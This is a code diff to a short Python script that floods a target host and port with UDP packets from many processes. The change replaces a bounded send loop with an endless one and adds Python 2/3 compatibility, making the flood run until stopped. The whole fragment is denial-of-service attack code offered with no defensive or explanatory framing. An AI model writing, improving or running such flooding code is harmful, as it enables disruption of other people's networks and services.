@@ -1,3 +1,4 @@
+import sys
 import socket
 import multiprocessing as MP
 
@@ -8,8 +9,11 @@ procs = []
 
 def sp():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    for z in range(666420311):
-        sock.sendto(bytes(payload, "utf-8"), (target, port))
+    while True:
+        if sys.version_info < (3, 0):
+            sock.sendto(payload, (target, port))
+        elif sys.version_info > (3, 0):
+            sock.sendto(bytes(payload, "utf-8"), (target, port))
 
 if __name__ == "__main__":
     for a in range(24):
